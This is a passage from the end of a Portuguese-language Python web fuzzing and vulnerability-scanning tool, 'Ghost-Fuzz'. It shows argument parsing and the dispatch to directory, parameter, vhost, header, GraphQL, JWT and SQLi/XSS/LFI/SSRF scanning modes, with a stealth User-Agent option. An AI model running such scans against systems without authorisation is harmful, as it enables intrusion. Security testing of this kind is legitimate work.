    p_jwt.add_argument("-t", "--token", required=True, help="Token JWT a manipular")
    p_jwt.add_argument("--param", default="token",
                       help="Nome do parametro GET que recebe o token (padrao: token)")

    # Modo VULN (Vulnerability Scanner)
    p_vuln = sub.add_parser("vuln", help="Scanner de vulnerabilidades web (SQLi/XSS/LFI/SSRF/CORS/Redirect)")
    p_vuln.add_argument("-u", "--url", required=True, help="URL alvo (use FUZZ como marcador de payload)")
    p_vuln.add_argument("--sqli", action="store_true", help="Testar SQL Injection")
    p_vuln.add_argument("--xss", action="store_true", help="Testar Cross-Site Scripting refletido")
    p_vuln.add_argument("--lfi", action="store_true", help="Testar Local File Inclusion")
    p_vuln.add_argument("--ssrf", action="store_true", help="Testar SSRF/IMDS (AWS/Azure/GCP)")
    p_vuln.add_argument("--cors", action="store_true", help="Testar CORS misconfiguration")
    p_vuln.add_argument("--redirect", action="store_true", help="Testar Open Redirect")
    p_vuln.add_argument("--all", action="store_true", dest="vuln_all", help="Executar todos os testes")

    # Opcoes globais para todos os modos
    for p in [p_dir, p_param, p_vhost, p_params, p_hdrs, p_gql, p_jwt, p_vuln]:
        p.add_argument("--threads", type=int, default=40, help="Threads (padrao: 40)")
        p.add_argument("--timeout", type=float, default=5, help="Timeout por req (padrao: 5)")
        p.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")
        p.add_argument("--stealth", action="store_true", help="User-Agent aleatorio")
        p.add_argument("--output", help="Salvar resultados em JSON")
        p.add_argument("--verbose", action="store_true", help="Saida detalhada")

    args = parser.parse_args()

    if not args.modo:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    print(BANNER)

    resultados = {
        "alvo": args.url if hasattr(args, "url") else "",
        "modo": args.modo,
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }

    if args.modo == "dir":
        wordlist = []
        if args.wordlist:
            try:
                with open(args.wordlist, "r") as f:
                    wordlist = [l.strip() for l in f if l.strip()]
                _log(f"Wordlist: {len(wordlist)} entradas de {args.wordlist}", "INFO")
            except Exception as e:
                _log(f"Erro ao ler wordlist: {e}", "ERRO")
                sys.exit(1)
        elif args.builtin:
            wordlist = WORDLISTS[args.builtin]
            _log(f"Usando wordlist embutida '{args.builtin}': {len(wordlist)} entradas", "INFO")
        else:
            wordlist = WORDLISTS["common"]
            _log(f"Usando wordlist 'common' embutida: {len(wordlist)} entradas", "INFO")

        ext = [e.strip() for e in args.ext.split(",")] if args.ext else None
        filter_status = [int(s) for s in args.filter_status.split(",")] if args.filter_status else None

        _log(f"Alvo: {args.url}", "INFO")
        _log(f"Threads: {args.threads} | Timeout: {args.timeout}s", "INFO")
        if ext:
            _log(f"Extensoes: {', '.join(ext)}", "INFO")

        r = fuzzing_dir(
            args.url, wordlist, extensoes=ext,
            threads=args.threads, timeout=args.timeout,
            filter_status=filter_status, filter_size=args.filter_size,
            stealth=args.stealth, proxy=args.proxy, verbose=args.verbose,
            recurse=args.recurse,
        )
        resultados.update(r)

    elif args.modo == "param":
        tipos = []
        if args.todos:
            tipos = list(PAYLOADS.keys())
        else:
            if args.lfi: tipos.append("lfi")
            if args.ssti: tipos.append("ssti")
            if args.ssrf: tipos.append("ssrf")
            if args.xss: tipos.append("xss")
            if args.sqli: tipos.append("sqli")
            if args.traversal: tipos.append("path_traversal")

        if not tipos:
            _log("Selecione ao menos um tipo: --lfi --ssti --ssrf --xss --sqli --traversal --todos", "ERRO")
            sys.exit(1)

        _log(f"Alvo: {args.url}", "INFO")
        _log(f"Tipos: {', '.join(tipos)}", "INFO")
        resultados["param_results"] = {}
        for tipo in tipos:
            print(f"\n{C['C']}  --- {tipo.upper()} ---{C['X']}")
            r = fuzzing_param(
                args.url, tipo, callback_url=args.callback,
                threads=args.threads, timeout=args.timeout,
                stealth=args.stealth, proxy=args.proxy, verbose=args.verbose,
            )
            resultados["param_results"][tipo] = r

    elif args.modo == "vhost":
        wordlist = None
        if args.wordlist:
            try:
                with open(args.wordlist, "r") as f:
                    wordlist = [l.strip() for l in f if l.strip()]
            except Exception as e:
                _log(f"Erro ao ler wordlist: {e}", "ERRO")

        _log(f"Alvo: {args.url} | Dominio: {args.dominio}", "INFO")
        r = fuzzing_vhost(
            args.url, args.dominio, wordlist=wordlist,
            threads=args.threads, timeout=args.timeout,
            stealth=args.stealth, proxy=args.proxy, verbose=args.verbose,
        )
        resultados.update(r)

    elif args.modo == "params":
        alvos = [args.url]
        if hasattr(args, "from_recon") and args.from_recon:
            alvos = importar_recon_json(args.from_recon) or [args.url]
        wordlist_params = None
        if args.wordlist:
            try:
                with open(args.wordlist, "r") as f:
                    wordlist_params = [l.strip() for l in f if l.strip()]
            except Exception as e:
                _log(f"Erro ao ler wordlist: {e}", "ERRO")
        resultados["param_discovery"] = []
        for alvo in alvos:
            _log(f"Param discovery: {alvo}", "INFO")
            r = fuzzing_param_discovery(
                alvo, wordlist=wordlist_params,
                stealth=args.stealth, proxy=args.proxy,
                timeout=args.timeout, threads=args.threads,
                verbose=args.verbose,
            )
            resultados["param_discovery"].append(r)

    elif args.modo == "headers":
        _log(f"Alvo: {args.url}", "INFO")
        r = fuzzing_headers(
            args.url, headers_selecionados=args.headers_selecionados,
            stealth=args.stealth, proxy=args.proxy,
            timeout=args.timeout, verbose=args.verbose,
        )
        resultados["header_fuzz"] = r

    elif args.modo == "graphql":
        _log(f"Alvo: {args.url}", "INFO")
        r = detectar_graphql(
            args.url, stealth=args.stealth, proxy=args.proxy,
            timeout=args.timeout, verbose=args.verbose,
        )
        resultados["graphql"] = r
        if r.get("schema"):
            schema_file = "graphql_schema.json"
            try:
                with open(schema_file, "w", encoding="utf-8") as f:
                    f.write(r["schema"])
                _log(f"Schema salvo em: {schema_file}", "OK")
            except Exception:
                pass

    elif args.modo == "jwt":
        _log(f"Alvo: {args.url} | Param: {args.param}", "INFO")
        r = testar_jwt(
            args.token, args.url, param=args.param,
            stealth=args.stealth, proxy=args.proxy,
            timeout=args.timeout, verbose=args.verbose,
        )
        resultados["jwt"] = r

    elif args.modo == "vuln":
        checks = []
        if args.vuln_all:
            checks = ["sqli", "xss", "lfi", "ssrf", "cors", "redirect"]
        else:
            if args.sqli: checks.append("sqli")
            if args.xss: checks.append("xss")
            if args.lfi: checks.append("lfi")
            if args.ssrf: checks.append("ssrf")
            if args.cors: checks.append("cors")
            if args.redirect: checks.append("redirect")
        if not checks:
            _log("Selecione ao menos um: --sqli --xss --lfi --ssrf --cors --redirect --all", "ERRO")
            sys.exit(1)
        _log(f"Alvo: {args.url} | Testes: {', '.join(checks)}", "INFO")
        r = fuzzing_vuln(
            args.url, checks, timeout=args.timeout,
            proxy=args.proxy, stealth=args.stealth, verbose=args.verbose,
        )
        resultados["vuln"] = r

    if args.output:
        gerar_relatorio(resultados, args.output)

    print(f"\n  {C['G']}{C['N']}[+] Ghost-Fuzz finalizado.{C['X']}\n")


if __name__ == "__main__":
    main()
